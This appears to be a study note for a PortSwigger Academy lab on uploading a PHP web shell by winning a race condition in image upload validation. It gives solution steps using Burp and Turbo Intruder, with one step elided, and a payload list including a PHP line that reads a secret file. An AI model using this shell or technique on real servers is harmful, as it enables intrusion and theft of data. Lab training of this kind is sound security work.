# Lab: Web shell upload via race condition

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

## Lab idea

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them. This lab focuses on a timing flaw in otherwise robust upload validation. It practices reasoning about whether uploaded content becomes accessible before validation and cleanup have fully completed.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
3. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret.
4. Log in and attempt to upload the script as your avatar.
- …
6. At the bottom of the Turbo Intruder window, click Attack .
7. In the results list, notice that some of the GET requests received a 200 response containing Carlos's secret.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `POST /my-account/avatar`
- `<YOUR-POST-REQUEST>`
- `<YOUR-GET-REQUEST>`
- `GET /files/avatars/<YOUR-IMAGE>`
- `POST`
- `/files/avatars/exploit.php`
- `\r\n\r\n`

## Official source
- [PortSwigger Academy: Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
